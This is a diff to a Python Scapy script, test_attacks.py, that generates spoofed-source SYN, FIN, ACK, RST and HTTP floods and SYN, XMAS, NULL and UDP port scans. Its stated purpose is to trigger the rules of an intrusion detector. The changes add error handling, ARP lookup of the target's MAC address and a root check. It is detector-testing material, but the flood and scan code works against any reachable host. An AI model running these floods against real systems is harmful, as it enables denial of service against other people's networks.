@@ -328,8 +328,6 @@
 #     print("  Done. Check http://127.0.0.1:8090/attacks for alerts.")
 #     print("="*60)
 
-
-
 """
 test_attacks.py — Known Attack Test Suite
 ==========================================
@@ -342,12 +340,12 @@ Each attack is designed to trigger a SPECIFIC named rule:
   CREDENTIAL_STUFFING, DoS
 
 Usage:
-  sudo $(which python) test_attacks.py --target 172.20.10.2 --attack list
-  sudo $(which python) test_attacks.py --target 172.20.10.2 --attack 2  --iface wlan0
-  sudo $(which python) test_attacks.py --target 172.20.10.2 --attack all --iface wlan0
-  sudo $(which python) test_attacks.py --target 172.20.10.2 --attack bruteforce --iface wlan0
-  sudo $(which python) test_attacks.py --target 172.20.10.2 --attack floods --iface wlan0
-  sudo $(which python) test_attacks.py --target 172.20.10.2 --attack scans --iface wlan0
+  sudo python3 test_attacks.py --target 172.20.10.2 --attack list
+  sudo python3 test_attacks.py --target 172.20.10.2 --attack 2 --iface wlan0
+  sudo python3 test_attacks.py --target 172.20.10.2 --attack all --iface wlan0
+  sudo python3 test_attacks.py --target 172.20.10.2 --attack bruteforce --iface wlan0
+  sudo python3 test_attacks.py --target 172.20.10.2 --attack floods --iface wlan0
+  sudo python3 test_attacks.py --target 172.20.10.2 --attack scans --iface wlan0
 
 WARNING: Only run on systems and networks you own and control.
 """
@@ -357,15 +355,17 @@ import time
 import random
 import subprocess
 import re
+import sys
+import os  # ADD THIS MISSING IMPORT
 from scapy.all import (
     IP, TCP, UDP, ICMP, Raw, Ether,
-    sendp, fragment, conf, get_if_hwaddr
+    sendp, fragment, conf, get_if_hwaddr, srp1, ARP
 )
 conf.verb = 0
 
 # Globals set from --iface argument
 IFACE  = "wlan0"
-GW_MAC = None
+TARGET_MAC = None
 MY_MAC = None
 
 
@@ -375,8 +375,7 @@ MY_MAC = None
 
 def rand_ip():
     """Generate a random non-reserved IP for spoofing."""
-    return (f"{random.randint(1,254)}.{random.randint(1,254)}."
-            f"{random.randint(1,254)}.{random.randint(1,254)}")
+    return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
 
 def rand_port():
     return random.randint(1024, 65535)
@@ -384,44 +383,57 @@ def rand_port():
 def status(msg):
     print(f"  -> {msg}")
 
+def get_mac(ip, iface):
+    """Get MAC address using ARP request."""
+    try:
+        arp_request = ARP(pdst=ip)
+        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+        packet = ether / arp_request
+        result = srp1(packet, timeout=2, iface=iface, verbose=False)
+        if result:
+            return result.hwsrc
+    except Exception as e:
+        print(f"  ARP error: {e}")
+    return None
+
 def resolve_macs(iface, target):
     """Resolve our MAC and target MAC for Layer-2 sending."""
-    global GW_MAC, MY_MAC
+    global TARGET_MAC, MY_MAC
+    
+    # Get own MAC
     try:
         MY_MAC = get_if_hwaddr(iface)
         print(f"  Own MAC    : {MY_MAC}")
-    except Exception:
+    except Exception as e:
         MY_MAC = "02:00:00:00:00:01"
-        print(f"  Own MAC    : fallback {MY_MAC}")
-    # Ping to populate ARP cache
-    subprocess.call(["ping", "-c", "1", "-W", "1", target],
-                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    try:
-        out = subprocess.check_output(["arp", "-n"], text=True)
-        for line in out.splitlines():
-            if target in line:
-                m = re.search(r"([0-9a-f]{2}[:\-]){5}[0-9a-f]{2}", line, re.I)
-                if m:
-                    GW_MAC = m.group(0)
-                    print(f"  Target MAC : {GW_MAC}")
-                    return
-    except Exception:
-        pass
-    GW_MAC = "ff:ff:ff:ff:ff:ff"
-    print("  Target MAC : broadcast fallback")
+        print(f"  Own MAC    : fallback {MY_MAC} (error: {e})")
+    
+    # Get target MAC via ARP
+    print(f"  Resolving MAC for {target}...")
+    TARGET_MAC = get_mac(target, iface)
+    
+    if TARGET_MAC:
+        print(f"  Target MAC : {TARGET_MAC}")
+    else:
+        TARGET_MAC = "ff:ff:ff:ff:ff:ff"
+        print(f"  Target MAC : broadcast fallback (ARP failed)")
 
 def xsend(pkt):
     """
     Layer-2 send using a real Ethernet frame.
-    Avoids scapy MAC resolution failures that stop after ~15 packets.
+    Avoids scapy MAC resolution failures.
     """
-    sendp(Ether(src=MY_MAC, dst=GW_MAC) / pkt, iface=IFACE, verbose=False)
+    if TARGET_MAC and MY_MAC:
+        frame = Ether(src=MY_MAC, dst=TARGET_MAC) / pkt
+        sendp(frame, iface=IFACE, verbose=False)
+    else:
+        # Fallback: let scapy handle it
+        sendp(pkt, iface=IFACE, verbose=False)
 
 def print_header(num, name, target, extra=""):
     print(f"\n{'='*55}")
     print(f"  [{num}] {name}")
     print(f"  Target : {target}  {extra}")
-    print(f"  Expected alert in main.py : see comment above function")
     print(f"{'='*55}")
 
 
@@ -433,71 +445,75 @@ def attack_fin_flood(target, duration=30, pps=300):
     """
     Expected alert : FIN_FLOOD
     How            : Sends bare FIN packets (no ACK/SYN) at 300 pps.
-                     main.py detects is_pure_fin pps > FIN_FLOOD_THRESHOLD(150)
     """
     print_header(2, "TCP FIN Flood", target, f"pps={pps}  duration={duration}s")
     status("Bare FIN — no ACK/SYN → triggers FIN_FLOOD rule")
     end_time = time.time() + duration
     count = 0
     while time.time() < end_time:
-        xsend(IP(src=rand_ip(), dst=target) /
-              TCP(sport=rand_port(), dport=rand_port(), flags="F"))
-        count += 1
-        if count % 500 == 0:
-            status(f"Sent {count} packets...")
-        time.sleep(1.0 / pps)
+        try:
+            xsend(IP(src=rand_ip(), dst=target) /
+                  TCP(sport=rand_port(), dport=rand_port(), flags="F"))
+            count += 1
+            if count % 500 == 0:
+                status(f"Sent {count} packets...")
+            time.sleep(1.0 / pps)
+        except Exception as e:
+            status(f"Error: {e}")
+            time.sleep(0.1)
     print(f"  [DONE] Sent {count} FIN packets.")
 
 
 def attack_ack_flood(target, duration=30, pps=300):
     """
     Expected alert : ACK_FLOOD
-    How            : Sends pure ACK (no SYN/PSH/RST/FIN) at 300 pps.
-                     main.py detects is_ack_only pps > ACK_FLOOD_THRESHOLD(150)
     """
     print_header(3, "TCP ACK Flood", target, f"pps={pps}  duration={duration}s")
     status("Pure ACK only — no SYN/PSH → triggers ACK_FLOOD rule")
     end_time = time.time() + duration
     count = 0
     while time.time() < end_time:
-        xsend(IP(src=rand_ip(), dst=target) /
-              TCP(sport=rand_port(), dport=rand_port(), flags="A",
-                  seq=random.randint(0, 2**32 - 1),
-                  ack=random.randint(0, 2**32 - 1)))
-        count += 1
-        if count % 500 == 0:
-            status(f"Sent {count} packets...")
-        time.sleep(1.0 / pps)
+        try:
+            xsend(IP(src=rand_ip(), dst=target) /
+                  TCP(sport=rand_port(), dport=rand_port(), flags="A",
+                      seq=random.randint(0, 2**32 - 1),
+                      ack=random.randint(0, 2**32 - 1)))
+            count += 1
+            if count % 500 == 0:
+                status(f"Sent {count} packets...")
+            time.sleep(1.0 / pps)
+        except Exception as e:
+            status(f"Error: {e}")
+            time.sleep(0.1)
     print(f"  [DONE] Sent {count} ACK packets.")
 
 
 def attack_rst_flood(target, duration=20, pps=200):
     """
     Expected alert : RST_FLOOD
-    How            : Sends bare RST packets at 200 pps.
-                     main.py detects is_pure_rst pps > RST_FLOOD_THRESHOLD(150)
     """
     print_header(17, "TCP RST Flood", target, f"pps={pps}  duration={duration}s")
     status("Bare RST packets → triggers RST_FLOOD rule")
     end_time = time.time() + duration
     count = 0
     while time.time() < end_time:
-        xsend(IP(src=rand_ip(), dst=target) /
-              TCP(sport=rand_port(), dport=rand_port(), flags="R",
-                  seq=random.randint(0, 2**32 - 1)))
-        count += 1
-        if count % 500 == 0:
-            status(f"Sent {count} packets...")
-        time.sleep(1.0 / pps)
+        try:
+            xsend(IP(src=rand_ip(), dst=target) /
+                  TCP(sport=rand_port(), dport=rand_port(), flags="R",
+                      seq=random.randint(0, 2**32 - 1)))
+            count += 1
+            if count % 500 == 0:
+                status(f"Sent {count} packets...")
+            time.sleep(1.0 / pps)
+        except Exception as e:
+            status(f"Error: {e}")
+            time.sleep(0.1)
     print(f"  [DONE] Sent {count} RST packets.")
 
 
 def attack_http_flood(target, duration=30, pps=200):
     """
     Expected alert : HTTP_FLOOD
-    How            : Sends PSH+ACK HTTP payloads to port 80 at 200 pps.
-                     main.py detects is_psh_ack + dport in HTTP_PORTS
-                     pps > HTTP_FLOOD_THRESHOLD(150)
     """
     print_header(13, "HTTP Flood", target, f"pps={pps}  duration={duration}s  port=80")
     status("PSH+ACK with HTTP payload to port 80 → triggers HTTP_FLOOD rule")
@@ -506,34 +522,40 @@ def attack_http_flood(target, duration=30, pps=200):
     end_time = time.time() + duration
     count = 0
     while time.time() < end_time:
-        xsend(IP(src=rand_ip(), dst=target) /
-              TCP(sport=rand_port(), dport=80, flags="PA",
-                  seq=random.randint(0, 2**32 - 1)) /
-              Raw(load=payload))
-        count += 1
-        if count % 500 == 0:
-            status(f"Sent {count} packets...")
-        time.sleep(1.0 / pps)
+        try:
+            xsend(IP(src=rand_ip(), dst=target) /
+                  TCP(sport=rand_port(), dport=80, flags="PA",
+                      seq=random.randint(0, 2**32 - 1)) /
+                  Raw(load=payload))
+            count += 1
+            if count % 500 == 0:
+                status(f"Sent {count} packets...")
+            time.sleep(1.0 / pps)
+        except Exception as e:
+            status(f"Error: {e}")
+            time.sleep(0.1)
     print(f"  [DONE] Sent {count} HTTP flood packets.")
 
 
 def attack_syn_flood(target, duration=15, pps=600):
     """
     Expected alert : DoS SYN_FLOOD
-    How            : Sends pure SYN at 600 pps (> DOS_PPS_THRESHOLD=500).
-                     main.py detects is_syn pps > DOS_PPS_THRESHOLD
     """
     print_header("DoS", "SYN Flood (DoS)", target, f"pps={pps}  duration={duration}s")
     status("Pure SYN at 600 pps → triggers DoS SYN_FLOOD rule")
     end_time = time.time() + duration
     count = 0
     while time.time() < end_time:
-        xsend(IP(src=rand_ip(), dst=target) /
-              TCP(sport=rand_port(), dport=rand_port(), flags="S"))
-        count += 1
-        if count % 1000 == 0:
-            status(f"Sent {count} packets...")
-        time.sleep(1.0 / pps)
+        try:
+            xsend(IP(src=rand_ip(), dst=target) /
+                  TCP(sport=rand_port(), dport=rand_port(), flags="S"))
+            count += 1
+            if count % 1000 == 0:
+                status(f"Sent {count} packets...")
+            time.sleep(1.0 / pps)
+        except Exception as e:
+            status(f"Error: {e}")
+            time.sleep(0.1)
     print(f"  [DONE] Sent {count} SYN packets.")
 
 
@@ -544,73 +566,81 @@ def attack_syn_flood(target, duration=15, pps=600):
 def attack_syn_scan(target, ports=500):
     """
     Expected alert : PORT_SCAN
-    How            : Sends SYN to 500 different ports from one IP.
-                     main.py detects unique dports >= PORT_SCAN_THRESHOLD(30)
     """
     print_header(1, "SYN Port Scan", target, f"ports={ports}")
     status("SYN to 500 unique ports → triggers PORT_SCAN rule")
     src_ip = rand_ip()
     for i, dport in enumerate(random.sample(range(1, 65535), min(ports, 65534))):
-        xsend(IP(src=src_ip, dst=target) /
-              TCP(sport=rand_port(), dport=dport, flags="S"))
-        if i % 100 == 0:
-            status(f"Scanned {i}/{ports} ports...")
-        time.sleep(0.005)
+        try:
+            xsend(IP(src=src_ip, dst=target) /
+                  TCP(sport=rand_port(), dport=dport, flags="S"))
+            if i % 100 == 0:
+                status(f"Scanned {i}/{ports} ports...")
+            time.sleep(0.005)
+        except Exception as e:
+            status(f"Error: {e}")
+            time.sleep(0.01)
     print(f"  [DONE] SYN scanned {ports} ports.")
 
 
 def attack_xmas_scan(target, ports=500):
     """
     Expected alert : XMAS_SCAN
-    How            : Sends FIN+PSH+URG to 500 different ports from one IP.
-                     main.py detects is_xmas unique dports >= XMAS_SCAN_THRESHOLD(20)
     """
     print_header(5, "XMAS Scan", target, f"ports={ports}")
     status("FIN+PSH+URG to 500 ports → triggers XMAS_SCAN rule")
     src_ip = rand_ip()
     for i, dport in enumerate(random.sample(range(1, 65535), min(ports, 65534))):
-        xsend(IP(src=src_ip, dst=target) /
-              TCP(sport=rand_port(), dport=dport, flags="FPU"))
-        if i % 100 == 0:
-            status(f"Scanned {i}/{ports} ports...")
-        time.sleep(0.005)
+        try:
+            xsend(IP(src=src_ip, dst=target) /
+                  TCP(sport=rand_port(), dport=dport, flags="FPU"))
+            if i % 100 == 0:
+                status(f"Scanned {i}/{ports} ports...")
+            time.sleep(0.005)
+        except Exception as e:
+            status(f"Error: {e}")
+            time.sleep(0.01)
     print(f"  [DONE] XMAS scanned {ports} ports.")
 
 
 def attack_null_scan(target, ports=500):
     """
     Expected alert : NULL_SCAN
-    How            : Sends TCP flags=0 to 500 different ports from one IP.
-                     main.py detects is_null unique dports >= NULL_SCAN_THRESHOLD(20)
     """
     print_header(6, "NULL Scan", target, f"ports={ports}")
     status("TCP flags=0 to 500 ports → triggers NULL_SCAN rule")
     src_ip = rand_ip()
     for i, dport in enumerate(random.sample(range(1, 65535), min(ports, 65534))):
-        xsend(IP(src=src_ip, dst=target) /
-              TCP(sport=rand_port(), dport=dport, flags=0))
-        if i % 100 == 0:
-            status(f"Scanned {i}/{ports} ports...")
-        time.sleep(0.005)
+        try:
+            xsend(IP(src=src_ip, dst=target) /
+                  TCP(sport=rand_port(), dport=dport, flags=0))
+            if i % 100 == 0:
+                status(f"Scanned {i}/{ports} ports...")
+            time.sleep(0.005)
+        except Exception as e:
+            status(f"Error: {e}")
+            time.sleep(0.01)
     print(f"  [DONE] NULL scanned {ports} ports.")
 
 
 def attack_udp_scan(target, ports=400):
     """
     Expected alert : UDP_SCAN
-    How            : Sends UDP to 400 different ports from one IP.
-                     main.py detects unique udp dports >= UDP_SCAN_THRESHOLD(20)
     """
     print_header("US", "UDP Scan", target, f"ports={ports}")
     status("UDP to 400 unique ports → triggers UDP_SCAN rule")
     src_ip = rand_ip()
     for i, dport in enumerate(random.sample(range(1, 65535), min(ports, 65534))):
-        xsend(IP(src=src_ip, dst=target) /
-              UDP(sport=rand_port(), dport=dport) /
-              Raw(load=b"\x00" * 10))
-        if i % 100 == 0:
-            status(f"Scanned {i}/{ports} ports...")
-        time.sleep(0.005)
+        try:
+            xsend(IP(src=src_ip, dst=target) /
+                  UDP(sport=rand_port(), dport=dport) /
+                  Raw(load=b"\x00" * 10))
+            if i % 100 == 0:
+                status(f"Scanned {i}/{ports} ports...")
+            time.sleep(0.005)
+        except Exception as e:
+            status(f"Error: {e}")
+            time.sleep(0.01)
     print(f"  [DONE] UDP scanned {ports} ports.")
 
 
@@ -620,20 +650,22 @@ def attack_udp_scan(target, ports=400):
 
 def _brute_force(target, port, service, attempts=200, delay=0.08):
     """
-    Expected alert : BRUTE_FORCE  SERVICE=<service>  PORT=<port>
-    How            : Sends >= 30 SYN to same port within 60s from one IP.
-                     main.py detects attempts >= BRUTE_FORCE_THRESHOLD(30)
+    Expected alert : BRUTE_FORCE
     """
     print_header("BF", f"{service} Brute Force", target,
                  f"port={port}  attempts={attempts}")
     status(f"SYN to port {port} ({service}) from one IP → triggers BRUTE_FORCE rule")
     src_ip = rand_ip()
     for i in range(attempts):
-        xsend(IP(src=src_ip, dst=target) /
-              TCP(sport=rand_port(), dport=port, flags="S"))
-        if i % 50 == 0:
-            status(f"Attempt {i}/{attempts}...")
-        time.sleep(delay)
+        try:
+            xsend(IP(src=src_ip, dst=target) /
+                  TCP(sport=rand_port(), dport=port, flags="S"))
+            if i % 50 == 0:
+                status(f"Attempt {i}/{attempts}...")
+            time.sleep(delay)
+        except Exception as e:
+            status(f"Error: {e}")
+            time.sleep(0.1)
     print(f"  [DONE] Sent {attempts} {service} brute force packets.")
 
 
@@ -669,21 +701,20 @@ def attack_postgres_bruteforce(target):
 def attack_credential_stuffing(target, attempts=300):
     """
     Expected alert : CREDENTIAL_STUFFING
-    How            : Sends 300 SYN to port 443 from 300 DIFFERENT spoofed IPs.
-                     main.py detects unique source IPs >= CRED_STUFF_SRC_THRESHOLD(200)
-                     Note: different from brute force (one IP) — this is MANY IPs
     """
     print_header(14, "Credential Stuffing", target,
                  f"port=443  unique_srcs={attempts}")
     status("300 DIFFERENT spoofed IPs to port 443 → triggers CREDENTIAL_STUFFING rule")
-    status("(Different from brute force — many IPs, not one IP)")
     for i in range(attempts):
-        # Each packet uses a completely different source IP
-        xsend(IP(src=rand_ip(), dst=target) /
-              TCP(sport=rand_port(), dport=443, flags="S"))
-        if i % 50 == 0:
-            status(f"Attempt {i}/{attempts} (unique IPs)...")
-        time.sleep(0.05)
+        try:
+            xsend(IP(src=rand_ip(), dst=target) /
+                  TCP(sport=rand_port(), dport=443, flags="S"))
+            if i % 50 == 0:
+                status(f"Attempt {i}/{attempts} (unique IPs)...")
+            time.sleep(0.05)
+        except Exception as e:
+            status(f"Error: {e}")
+            time.sleep(0.1)
     print(f"  [DONE] Sent {attempts} credential stuffing packets.")
 
 
@@ -724,6 +755,12 @@ BRUTEFORCE_GROUP = ["11", "12", "15", "16", "18", "19", "20", "21"]
 # MAIN
 # =============================================================================
 if __name__ == "__main__":
+    # Check for root privileges
+    if os.geteuid() != 0:
+        print("ERROR: This script requires root privileges to send raw packets.")
+        print("Please run with: sudo python3 test_attacks.py [options]")
+        sys.exit(1)
+    
     parser = argparse.ArgumentParser(
         description="Known Attack Test Suite — tests rule-based detectors in main.py"
     )
@@ -742,9 +779,9 @@ if __name__ == "__main__":
     # ── List mode ────────────────────────────────────────────
     if args.attack == "list":
         print("\n  Known Attack Test Suite — Available Attacks")
-        print("  " + "-"*50)
-        print(f"  {'Key':<8} {'Name':<30} {'Expected Alert'}")
-        print("  " + "-"*50)
+        print("  " + "-"*60)
+        print(f"  {'Key':<8} {'Name':<30} {'Expected Alert':<30}")
+        print("  " + "-"*60)
         alerts = {
             "syn":  "DoS SYN_FLOOD",
             "2":    "FIN_FLOOD",
@@ -766,15 +803,16 @@ if __name__ == "__main__":
             "14":   "CREDENTIAL_STUFFING",
         }
         for key, (name, _) in ATTACKS.items():
-            print(f"  {key:<8} {name:<30} {alerts.get(key,'')}")
+            alert = alerts.get(key, "")
+            print(f"  {key:<8} {name:<30} {alert:<30}")
         print()
         print("  Groups:  floods | scans | bruteforce | all")
         print()
-        raise SystemExit(0)
+        sys.exit(0)
 
     if not args.target:
         print("Error: --target required.  e.g. --target 172.20.10.2")
-        raise SystemExit(1)
+        sys.exit(1)
 
     print("\n" + "="*60)
     print("  Known Attack Test Suite")
@@ -791,33 +829,42 @@ if __name__ == "__main__":
     def run_group(keys):
         for key in keys:
             name, func = ATTACKS[key]
+            print(f"\n  Starting attack: {name}")
             func(args.target)
             print(f"\n  Waiting 5s before next attack...")
             time.sleep(5)
 
-    if args.attack == "floods":
-        print("  Running all flood attacks...\n")
-        run_group(FLOOD_GROUP)
+    try:
+        if args.attack == "floods":
+            print("  Running all flood attacks...\n")
+            run_group(FLOOD_GROUP)
 
-    elif args.attack == "scans":
-        print("  Running all scan attacks...\n")
-        run_group(SCAN_GROUP)
+        elif args.attack == "scans":
+            print("  Running all scan attacks...\n")
+            run_group(SCAN_GROUP)
 
-    elif args.attack == "bruteforce":
-        print("  Running all brute force attacks...\n")
-        run_group(BRUTEFORCE_GROUP)
+        elif args.attack == "bruteforce":
+            print("  Running all brute force attacks...\n")
+            run_group(BRUTEFORCE_GROUP)
 
-    elif args.attack == "all":
-        print("  Running ALL known attacks...\n")
-        run_group(list(ATTACKS.keys()))
+        elif args.attack == "all":
+            print("  Running ALL known attacks...\n")
+            run_group(list(ATTACKS.keys()))
 
-    elif args.attack in ATTACKS:
-        ATTACKS[args.attack][1](args.target)
+        elif args.attack in ATTACKS:
+            ATTACKS[args.attack][1](args.target)
 
-    else:
-        print(f"  Unknown attack '{args.attack}'.")
-        print("  Use --attack list  to see all options.")
-        raise SystemExit(1)
+        else:
+            print(f"  Unknown attack '{args.attack}'.")
+            print("  Use --attack list  to see all options.")
+            sys.exit(1)
+
+    except KeyboardInterrupt:
+        print("\n\n  [INTERRUPTED] Test stopped by user.")
+    except Exception as e:
+        print(f"\n  [ERROR] {e}")
+        import traceback
+        traceback.print_exc()
 
     print("\n" + "="*60)
     print("  All done.")
